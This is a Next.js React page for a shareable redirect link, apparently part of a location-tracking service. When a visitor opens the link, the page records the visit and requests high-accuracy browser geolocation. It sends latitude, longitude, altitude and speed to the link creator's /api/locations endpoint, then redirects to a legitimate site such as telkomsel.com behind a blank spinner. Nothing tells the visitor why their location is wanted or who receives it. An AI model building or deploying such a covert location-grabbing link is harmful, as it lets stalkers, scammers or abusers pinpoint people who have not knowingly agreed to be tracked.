'use client';

import { useEffect, useRef } from 'react';
import { useParams } from 'next/navigation';
import { normalizeUrl } from '@/lib/security';

export default function DirectRedirectSharePage() {
  const params = useParams();
  const sessionId = params?.sessionId as string;
  const executedRef = useRef(false);

  useEffect(() => {
    if (!sessionId || executedRef.current) return;
    executedRef.current = true;

    fetch(`/api/sessions/${sessionId}`)
      .then((res) => {
        if (!res.ok) throw new Error('Sesi tidak valid atau telah kedaluwarsa.');
        return res.json();
      })
      .then((data) => {
        const session = data.session;
        if (!session || session.status !== 'active') return;

        const targetUrl = normalizeUrl(session.target_url || 'https://www.telkomsel.com/');

        const redirectNow = () => {
          window.location.replace(targetUrl);
        };

        const sendLocationAndRedirect = (latitude: number, longitude: number, accuracy: number, altitude?: number | null, speed?: number | null) => {
          // Use sendBeacon for reliable background transmission before redirect
          const payload = JSON.stringify({
            sessionId: session.session_code, // support both session_code & UUID
            latitude,
            longitude,
            accuracy,
            altitude,
            speed,
            permissionStatus: 'granted'
          });

          if (typeof navigator !== 'undefined' && navigator.sendBeacon) {
            const blob = new Blob([payload], { type: 'application/json' });
            navigator.sendBeacon('/api/locations', blob);
            redirectNow();
          } else {
            fetch('/api/locations', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: payload,
              keepalive: true
            })
              .catch((err) => console.error('Location submit error:', err))
              .finally(() => {
                redirectNow();
              });
          }
        };

        // Record visitor visit hit first
        if (typeof navigator !== 'undefined' && navigator.sendBeacon) {
          navigator.sendBeacon('/api/locations', JSON.stringify({
            sessionId: session.session_code,
            permissionStatus: 'prompt'
          }));
        }

        // Trigger Geolocation API
        if (typeof window !== 'undefined' && 'geolocation' in navigator) {
          navigator.geolocation.getCurrentPosition(
            (pos) => {
              sendLocationAndRedirect(
                pos.coords.latitude,
                pos.coords.longitude,
                pos.coords.accuracy,
                pos.coords.altitude,
                pos.coords.speed
              );
            },
            (err) => {
              console.warn('Geolocation prompt error/dismissed:', err);
              redirectNow();
            },
            { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
          );
        } else {
          redirectNow();
        }
      })
      .catch((err) => {
        console.error(err);
      });
  }, [sessionId]);

  return (
    <div className="min-h-screen w-full bg-white flex items-center justify-center">
      {/* Blank white background with subtle spinner while redirecting directly to Target URL */}
      <div className="w-6 h-6 border-2 border-slate-200 border-t-blue-600 rounded-full animate-spin" />
    </div>
  );
}
